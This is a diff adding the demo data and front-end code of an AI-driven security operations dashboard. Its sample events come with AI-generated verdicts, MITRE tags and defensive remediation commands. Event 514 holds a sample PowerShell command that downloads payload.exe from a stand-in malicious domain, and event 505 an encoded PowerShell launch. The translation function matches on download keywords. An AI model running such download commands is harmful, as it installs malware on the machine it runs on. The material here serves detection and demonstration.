+    reason: "Process-listing reconnaissance via PowerShell on a production server — attackers map what's running before striking.", action: "**Analysis:** Reconnaissance activity on SERVER-PROD-02.\n**Remediation Command:**\n```powershell\nStop-Process -Name powershell -Force\nGet-WinEvent -LogName Security -MaxEvents 50\n```" }),
+  mkEvent({ id: 520, ts: "Oct 09 19:35:12", kind: "sudo", ip: "—", user: "ubuntu", host: "web-prod-02", cmd: "/usr/bin/systemctl restart nginx",
+    baseSev: "medium", threat: "LOW", mitre: "", risk: 20, corr: 0,
+    reason: "Web server restart by a system administrator — matches routine maintenance.", action: "N/A - no action needed." }),
+  mkEvent({ id: 519, ts: "Oct 09 19:34:55", kind: "login", ip: T1, user: "admin", host: "jump-gateway", port: 40221,
+    baseSev: "low", threat: "LOW", mitre: "", risk: 10, corr: 0,
+    reason: "Normal admin login from a trusted address.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 518, ts: "Oct 09 19:34:38", kind: "fail", ip: A5, user: "guest", host: "web-prod-01", port: 38122,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 4,
+    reason: "Failed login for the rarely-used 'guest' account — attackers love dormant accounts.", action: "**Analysis:** Brute-force on dormant account.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 61.177.173.35 -p tcp --dport 22 -j DROP\nusermod -L guest\n```" }),
+  mkEvent({ id: 517, ts: "Oct 09 19:34:20", kind: "win", ip: "—", user: "DESKTOP\\local_admin", host: "DESKTOP-SOC-01", proc: "C:\\Windows\\System32\\notepad.exe",
+    baseSev: "low", threat: "LOW", mitre: "", risk: 5, corr: 0,
+    reason: "Someone taking notes — benign.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 516, ts: "Oct 09 19:34:02", kind: "fake", ip: A1, user: "user", host: "mail-relay-01", port: 41222,
+    baseSev: "high", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 50, corr: 6,
+    reason: "Generic-username probe from a hostile IP.", action: "**Analysis:** Scanner probing mail-relay-01.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 185.220.101.5 -j DROP\n```" }),
+  mkEvent({ id: 515, ts: "Oct 09 19:33:44", kind: "fail", ip: A2, user: "postgres", host: "db-primary-01", port: 40222,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 9,
+    reason: "Same hostile IP now trying the database account — the attackers are pivoting through your fleet.", action: "**Analysis:** Fleet-wide brute-force campaign.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 45.147.229.11 -j DROP\n```" }),
+  mkEvent({ id: 514, ts: "Oct 09 19:33:26", kind: "ps", ip: "—", user: "NT AUTHORITY\\SYSTEM", host: "SERVER-PROD-02",
+    args: "-c Invoke-WebRequest -Uri http://malicious-domain.com/payload.exe -OutFile C:\\Users\\Public\\payload.exe",
+    baseSev: "low", threat: "HIGH", mitre: "T1059.001 - PowerShell abuse", risk: 85, corr: 3,
+    reason: "PowerShell downloading an executable from a known-malicious domain onto a production server.", action: "**Analysis:** Malware download on SERVER-PROD-02.\n**Remediation Command:**\n```powershell\nStop-Process -Name powershell -Force\nRemove-Item C:\\Users\\Public\\payload.exe -Force\nNew-NetFirewallRule -DisplayName 'Block-C2' -Direction Outbound -RemoteAddress 45.147.229.11 -Action Block\n```" }),
+  mkEvent({ id: 513, ts: "Oct 09 19:33:08", kind: "success", ip: A2, user: "root", host: "web-prod-01", port: 41222,
+    baseSev: "low", threat: "CRITICAL", mitre: "T1078 - Valid Accounts", risk: 95, corr: 14,
+    reason: "ROOT LOGIN SUCCEEDED from an IP that just failed 14 times. The brute-force worked. Assume full compromise of web-prod-01 and respond immediately.",
+    action: "**Analysis:** ROOT COMPROMISE on web-prod-01 — act now.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 45.147.229.11 -j DROP\npkill -u root -t pts/3\nlast -10\npasswd -l root\n```" }),
+  mkEvent({ id: 512, ts: "Oct 09 19:32:51", kind: "fail", ip: A4, user: "ubuntu", host: "app-stage-03", port: 55122,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 5,
+    reason: "Failed SSH attempts against the staging server.", action: "**Analysis:** Brute-force on app-stage-03.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 91.240.118.172 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 511, ts: "Oct 09 19:32:33", kind: "sudo", ip: "—", user: "deploy", host: "web-prod-02", cmd: "/usr/bin/apt update",
+    baseSev: "medium", threat: "LOW", mitre: "", risk: 20, corr: 0,
+    reason: "Routine package updates by the deployment account.", action: "N/A - no action needed." }),
+  mkEvent({ id: 510, ts: "Oct 09 19:32:15", kind: "login", ip: T2, user: "postgres", host: "db-primary-01", port: 51222,
+    baseSev: "low", threat: "LOW", mitre: "", risk: 10, corr: 0,
+    reason: "Routine database maintenance login from the internal network.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 509, ts: "Oct 09 19:31:58", kind: "fake", ip: A3, user: "test", host: "jump-gateway", port: 61222,
+    baseSev: "high", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 50, corr: 6,
+    reason: "Another fake-username probe against the jump gateway — your most sensitive entry point.", action: "**Analysis:** Scanner probing jump-gateway.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 194.26.29.156 -j DROP\n```" }),
+  mkEvent({ id: 508, ts: "Oct 09 19:31:40", kind: "fail", ip: A6, user: "jenkins", host: "app-stage-03", port: 34222,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 4,
+    reason: "Attempts against the CI/CD account — compromising it would give attackers code-deployment powers.", action: "**Analysis:** Brute-force on CI/CD account.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 218.92.0.204 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 507, ts: "Oct 09 19:31:22", kind: "win", ip: "—", user: "CORP\\hr_user", host: "WORKSTATION-HR", proc: "C:\\Windows\\System32\\svchost.exe",
+    baseSev: "low", threat: "LOW", mitre: "", risk: 5, corr: 0,
+    reason: "Normal Windows service activity. Benign.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 506, ts: "Oct 09 19:31:04", kind: "fail", ip: A5, user: "admin", host: "DC-CORP-01", port: 42122,
+    baseSev: "medium", threat: "HIGH", mitre: "T1110 - Brute Force", risk: 75, corr: 8,
+    reason: "Failed login against an ADMIN account on the DOMAIN CONTROLLER — if this succeeds, the attacker owns your whole network.", action: "**Analysis:** Critical brute-force targeting the domain controller.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 61.177.173.35 -j DROP\n# Alert the security team immediately\n```" }),
+  mkEvent({ id: 505, ts: "Oct 09 19:30:46", kind: "ps", ip: "—", user: "CORP\\admin_user", host: "DESKTOP-SOC-01",
+    args: "-ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...",
+    baseSev: "low", threat: "HIGH", mitre: "T1059.001 - PowerShell abuse", risk: 80, corr: 2,
+    reason: "Encoded PowerShell on an analyst workstation — ironically, the SOC machine itself is being probed.", action: "**Analysis:** Hidden PowerShell on DESKTOP-SOC-01.\n**Remediation Command:**\n```powershell\nStop-Process -Name powershell -Force\nGet-WinEvent -LogName Security -MaxEvents 100\n```" }),
+  mkEvent({ id: 504, ts: "Oct 09 19:30:28", kind: "success", ip: T1, user: "ubuntu", host: "web-prod-02", port: 43122,
+    baseSev: "low", threat: "LOW", mitre: "", risk: 10, corr: 0,
+    reason: "Normal admin login from a trusted address.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 503, ts: "Oct 09 19:30:10", kind: "fake", ip: A2, user: "oracle", host: "db-primary-01", port: 45122,
+    baseSev: "high", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 50, corr: 6,
+    reason: "Database-themed fake username probe.", action: "**Analysis:** Scanner probing db-primary-01.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 45.147.229.11 -j DROP\n```" }),
+  mkEvent({ id: 502, ts: "Oct 09 19:29:52", kind: "fail", ip: A1, user: "deploy", host: "jump-gateway", port: 46122,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 4,
+    reason: "Failed attempts against the deployment account on the jump gateway.", action: "**Analysis:** Brute-force on jump-gateway.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 185.220.101.5 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 501, ts: "Oct 09 19:29:34", kind: "win", ip: "—", user: "DESKTOP\\local_admin", host: "LAPTOP-CEO", proc: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    baseSev: "low", threat: "LOW", mitre: "", risk: 5, corr: 0,
+    reason: "Routine browsing on the CEO laptop. Benign.", action: "N/A - Event evaluated as non-suspicious." }),
+  mkEvent({ id: 500, ts: "Oct 09 19:29:16", kind: "sudo", ip: "—", user: "admin", host: "web-prod-01", cmd: "/bin/bash",
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1548 - Privilege escalation abuse", risk: 60, corr: 3,
+    reason: "Interactive admin shell opened on a web server during an active attack against the same machine — investigate before assuming it's routine.", action: "**Analysis:** Suspicious admin shell during active attack window.\n**Remediation Command:**\n```bash\nwho\nlast -10\nhistory | tail -30\n```" }),
+  mkEvent({ id: 499, ts: "Oct 09 19:28:58", kind: "fail", ip: A3, user: "root", host: "mail-relay-01", port: 47122,
+    baseSev: "medium", threat: "MEDIUM", mitre: "T1110 - Brute Force", risk: 55, corr: 5,
+    reason: "Failed root logins on the mail relay from a hostile IP.", action: "**Analysis:** Brute-force on mail-relay-01.\n**Remediation Command:**\n```bash\niptables -A INPUT -s 194.26.29.156 -p tcp --dport 22 -j DROP\n```" }),
+  mkEvent({ id: 498, ts: "Oct 09 19:28:40", kind: "login", ip: T2, user: "testuser", host: "app-stage-03", port: 48122,
+    baseSev: "low", threat: null, mitre: "", risk: null, corr: null, reason: "", action: "" }),
+  mkEvent({ id: 497, ts: "Oct 09 19:28:22", kind: "fail", ip: A4, user: "guest", host: "web-prod-02", port: 49122,
+    baseSev: "medium", threat: null, mitre: "", risk: null, corr: null, reason: "", action: "" }),
+];
+
+/* ── Helpers ─────────────────────────────────────── */
+const $ = (s) => document.querySelector(s);
+
+function displaySeverity(e) {
+  const t = (e.threat_level && e.threat_level !== "UNKNOWN" ? e.threat_level : e.severity || "low").toLowerCase();
+  return SEV_ORDER.includes(t) ? t : "low";
+}
+
+function chip(sev) {
+  return `<span class="chip chip-${sev}">${SEV_EMOJI[sev]} ${sev.toUpperCase()}</span>`;
+}
+
+function esc(s) {
+  return String(s ?? "—").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
+function translate(e) {
+  const ip = esc(e.source_ip), user = esc(e.user), host = esc(e.host);
+  const where = host && host !== "—" ? ` on <b>${host}</b>` : "";
+  const raw = (e.raw_log || "").toLowerCase();
+  if (e.log_source === "linux-auth") {
+    if (e.event_type === "privilege_escalation")
+      return `🔑 <b>${user}</b> ran a command with admin rights${where}`;
+    if (e.action === "failure") {
+      if (raw.includes("invalid user"))
+        return `🕵️ Someone tried a <b>fake username</b> (<code>${user}</code>) from <code>${ip}</code>${where}`;
+      return `🔐 Failed login attempt for <b>${user}</b> from <code>${ip}</code>${where}`;
+    }
+    return `✅ Successful login for <b>${user}</b> from <code>${ip}</code>${where}`;
+  }
+  if (raw.includes("encodedcommand"))
+    return `🧬 <b>Hidden/encoded PowerShell</b> launched${where}`;
+  if (raw.includes("invoke-webrequest") || raw.includes("downloadstring"))
+    return `⬇️ A program <b>downloaded a file</b>${where}`;
+  if (raw.includes("powershell"))
+    return `⚠️ Suspicious <b>PowerShell</b> activity${where}`;
+  return `🖥️ A program ran${where}`;
+}
+
+function mitrePlain(mitre) {
+  if (!mitre) return "Not classified yet";
+  for (const [id, meaning] of Object.entries(MITRE_PLAIN)) {
+    if (mitre.startsWith(id)) return `${esc(mitre)} — <i>${meaning}</i>`;
+  }
+  return esc(mitre);
+}
+
+function commandFromActions(actions) {
+  const m = (actions || "").match(/```(?:bash|powershell|sh)?\n([\s\S]*?)```/);
+  return m ? m[1].trim() : (actions || "").trim();
+}
+
+/* ── Rendering ───────────────────────────────────── */
+function renderKPIs() {
+  const ev = state.events;
+  const total = ev.length;
+  const threats = ev.filter((e) => ["medium", "high", "critical"].includes(displaySeverity(e))).length;
+  const freq = (key) => {
+    const counts = {};
+    ev.forEach((e) => { const v = e[key]; if (v && v !== "—") counts[v] = (counts[v] || 0) + 1; });
+    return Object.entries(counts).sort((a, b) => b[1] - a[1])[0]?.[0] || "N/A";
+  };
+  $("#kpiGrid").innerHTML = [
+    ["📥 EVENTS MONITORED", total.toLocaleString(), "small", "live counter — grows as events arrive"],
+    ["🚨 THREATS CAUGHT", threats.toLocaleString(), "small", "flagged dangerous by the AI agents"],
+    ["🎯 TOP ATTACKER IP", esc(freq("source_ip")), "small", "most frequent source of trouble"],
+    ["👤 MOST TARGETED ACCOUNT", esc(freq("user")), "small", "attackers aim at this account most"],
+  ].map(([label, value, cls, sub]) => `
+    <div class="kpi">
+      <div class="kpi-label">${label}</div>
+      <div class="kpi-value ${value.length > 12 ? "small" : ""}">${value}</div>
+      <div class="kpi-sub">${sub}</div>
+    </div>`).join("");
+}
+
+function renderDonut() {
+  const counts = { critical: 0, high: 0, medium: 0, low: 0 };
+  state.events.forEach((e) => counts[displaySeverity(e)]++);
+  const total = state.events.length || 1;
+  const r = 70, C = 2 * Math.PI * r;
+  let offset = 0;
+  const segs = SEV_ORDER.map((sev) => {
+    const frac = counts[sev] / total;
+    const seg = `<circle cx="95" cy="95" r="${r}" fill="none"
+      stroke="${SEV_COLORS[sev]}" stroke-width="26"
+      stroke-dasharray="${frac * C} ${C}"
+      stroke-dashoffset="${-offset}"
+      transform="rotate(-90 95 95)" stroke-linecap="butt"></circle>`;
+    offset += frac * C;
+    return seg;
+  }).join("");
+  $("#donutSvg").innerHTML = `
+    <circle cx="95" cy="95" r="${r}" fill="none" stroke="rgba(255,255,255,0.05)" stroke-width="26"></circle>
+    ${segs}
+    <text x="95" y="90" text-anchor="middle" fill="#fff" font-size="26" font-weight="800">${state.events.length}</text>
+    <text x="95" y="112" text-anchor="middle" class="donut-center-label">TOTAL EVENTS</text>`;
+  $("#donutLegend").innerHTML = SEV_ORDER.map((sev) => `
+    <div class="legend-row">
+      <span class="dot" style="background:${SEV_COLORS[sev]}"></span>
+      <span>${SEV_EMOJI[sev]} ${sev[0].toUpperCase() + sev.slice(1)}</span>
+      <span class="n">${counts[sev]}</span>
+    </div>`).join("");
+}
+
+function renderMachines() {
+  const counts = {};
+  state.events.forEach((e) => {
+    const h = e.host && e.host !== "—" ? e.host : "unknown machine";
+    counts[h] = (counts[h] || 0) + 1;
+  });
+  const rows = Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 8);
+  const max = rows[0]?.[1] || 1;
+  $("#machineBars").innerHTML = rows.map(([name, n]) => `
+    <div class="bar-row">
+      <div class="bar-name" title="${esc(name)}">${esc(name)}</div>
+      <div class="bar-track"><div class="bar-fill" style="width:${(n / max) * 100}%"></div></div>
+      <div class="bar-count">${n}</div>
+    </div>`).join("");
+}
+
+function renderFeed() {
+  $("#feed").innerHTML = state.events.slice(0, 8).map((e) => `
+    <div class="feed-row">
+      ${chip(displaySeverity(e))}
+      <div class="feed-text">${translate(e)}</div>
+      <div class="feed-meta">${esc(e.timestamp)} · event #${e.id}</div>
+    </div>`).join("");
+}
+
+function renderEventList() {
+  $("#eventList").innerHTML = state.events.map((e) => {
+    const sev = displaySeverity(e);
+    return `<button class="event-item ${state.selected === e.id ? "selected" : ""}" onclick="selectEvent(${e.id})">
+      <div class="idline">${chip(sev)} <b style="font-size:0.8rem;">#${e.id}</b></div>
+      <div class="sum">${translate(e)}</div>
+    </button>`;
+  }).join("");
+}
+
+function renderDetail() {
+  const e = state.events.find((x) => x.id === state.selected) || state.events[0];
+  if (!e) { $("#detailPanel").innerHTML = "<p>No events yet.</p>"; return; }
+  state.selected = e.id;
+  const sev = displaySeverity(e);
+  const analyzed = e.threat_level && e.threat_level !== "UNKNOWN";
+  const risk = e.risk_score;
+  const riskColor = risk >= 70 ? "var(--critical)" : risk >= 35 ? "var(--high)" : "var(--low)";
+  const riskCap = risk >= 70 ? "⚠️ High concern — act soon" : risk >= 35 ? "Medium concern" : "Low concern";
+  const cmd = commandFromActions(e.response_actions);
+
+  $("#detailPanel").innerHTML = `
+    <h4>🤖 What the AI decided &nbsp; ${chip(sev)}</h4>
+    ${analyzed ? "" : `<div class="pending-pill">⏳ This event is queued for AI analysis — verdict will appear within seconds.</div>`}
+    <div class="summary-big">${translate(e)}</div>
+    <div class="metric-grid">
+      <div class="metric"><div class="m-label">EVENT ID</div><div class="m-value">#${e.id}</div></div>
+      <div class="metric"><div class="m-label">MACHINE</div><div class="m-value">${esc(e.host)}</div></div>
+      <div class="metric"><div class="m-label">WHEN</div><div class="m-value">${esc(e.timestamp)}</div></div>
+      <div class="metric"><div class="m-label">ACCOUNT</div><div class="m-value">${esc(e.user)}</div></div>
+      <div class="metric"><div class="m-label">SOURCE IP</div><div class="m-value">${esc(e.source_ip)}</div></div>
+      <div class="metric"><div class="m-label">PLATFORM</div><div class="m-value">${e.log_source === "windows-sysmon" ? "🪟 Windows" : "🐧 Linux"}</div></div>
+    </div>
+    ${risk !== null && risk !== undefined ? `
+      <div style="font-size:0.88rem;font-weight:700;">Risk score: ${risk}/100</div>
+      <div class="risk-track"><div class="risk-fill" style="width:${risk}%;background:${riskColor};"></div></div>
+      <div class="cap-small">${riskCap}</div>` : ""}
+    ${e.mitre_technique ? `
+      <div class="mitre-box">
+        <b>Known attack pattern (MITRE ATT&CK):</b><br>${mitrePlain(e.mitre_technique)}
+      </div>` : ""}
+    ${e.correlated_event_count !== null && e.correlated_event_count !== undefined ? `
+      <div class="cap-small">🔗 Seen <b>${e.correlated_event_count}</b> related event(s) recently — ${e.correlated_event_count > 0 ? "this is not an isolated incident." : "looks isolated."}</div>` : ""}
+    ${e.analysis_reasoning ? `
+      <div class="reason-box"><b>🧠 AI reasoning:</b><br>${esc(e.analysis_reasoning)}</div>` : ""}
+    ${cmd ? `
+      <div class="fix-box">
+        <b>🛠️ Recommended fix</b> — copy &amp; run on the affected machine:
+        <div class="cmd">${esc(cmd)}<button class="copy-btn" onclick="copyCmd(this)">📋 copy</button></div>
+      </div>` : ""}
+    <details class="raw">
+      <summary>🔬 Technical details (raw evidence)</summary>
+      <div class="cmd" style="margin-top:6px;">${esc(e.raw_log)}</div>
+    </details>`;
+}
+
+function renderReports() {
+  const counts = { critical: 0, high: 0, medium: 0, low: 0 };
+  state.events.forEach((e) => counts[displaySeverity(e)]++);
+  $("#reportTable").innerHTML = `
+    <tr><th>THREAT LEVEL</th><th>EVENTS</th></tr>
+    ${SEV_ORDER.map((s) => `<tr><td>${chip(s)}</td><td><b>${counts[s]}</b></td></tr>`).join("")}
+    <tr><td><b>Total</b></td><td><b>${state.events.length}</b></td></tr>`;
+}
+
+function renderAll() {
+  renderKPIs(); renderDonut(); renderMachines(); renderFeed();
+  renderEventList(); renderDetail(); renderReports();
+}
+
+/* ── Interactions ────────────────────────────────── */
+function switchTab(name) {
+  document.querySelectorAll(".tab-btn").forEach((b) => b.classList.toggle("active", b.dataset.tab === name));
+  document.querySelectorAll(".tab-page").forEach((p) => p.classList.toggle("active", p.id === "tab-" + name));
+}
+
+function selectEvent(id) { state.selected = id; renderEventList(); renderDetail(); }
+
+function toggleSettings() { $("#settingsPanel").classList.toggle("open"); }
+
+function copyCmd(btn) {
+  const text = btn.parentElement.textContent.replace("📋 copy", "").trim();
+  navigator.clipboard?.writeText(text);
+  btn.textContent = "✓ copied!";
+  setTimeout(() => (btn.textContent = "📋 copy"), 1500);
+}
+
+function downloadCSV() {
+  const cols = ["id", "timestamp", "log_source", "event_type", "source_ip", "user", "host",
+    "severity", "threat_level", "mitre_technique", "risk_score", "correlated_event_count",
+    "analysis_reasoning", "response_actions", "raw_log"];
+  const cell = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`;
+  const csv = [cols.join(",")].concat(
+    state.events.map((e) => cols.map((c) => cell(e[c])).join(","))
+  ).join("\n");
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(new Blob([csv], { type: "text/csv" }));
+  a.download = "sih_agentic_soc_report.csv";
+  a.click();
+}
+
+/* ── Data loading (live API with demo fallback) ──── */
+async function tryLive() {
+  try {
+    const res = await fetch(state.apiBase + "/logs?limit=200", { signal: AbortSignal.timeout(3500) });
+    if (!res.ok) throw new Error("bad status");
+    const logs = await res.json();
+    if (!Array.isArray(logs) || !logs.length) throw new Error("empty");
+    state.events = logs;
+    state.live = true;
+  } catch {
+    state.events = DEMO_EVENTS;
+    state.live = false;
+  }
+  $("#demoBanner").style.display = state.live ? "none" : "block";
+  renderAll();
+}
+
+function connectApi() {
+  state.apiBase = $("#apiUrl").value.trim().replace(/\/$/, "") || "http://localhost:8001";
+  localStorage.setItem("socApiBase", state.apiBase);
+  tryLive();
+}
+
+function useDemo() {
+  state.events = DEMO_EVENTS; state.live = false;
+  $("#demoBanner").style.display = "block";
+  renderAll();
+}
+
+/* ── Boot ────────────────────────────────────────── */
+$("#apiUrl").value = state.apiBase;
+setInterval(() => {
+  $("#clock").textContent = new Date().toLocaleTimeString();
+}, 1000);
+$("#clock").textContent = new Date().toLocaleTimeString();
+tryLive();
+setInterval(tryLive, 10000);
+</script>
+</body>
+</html>
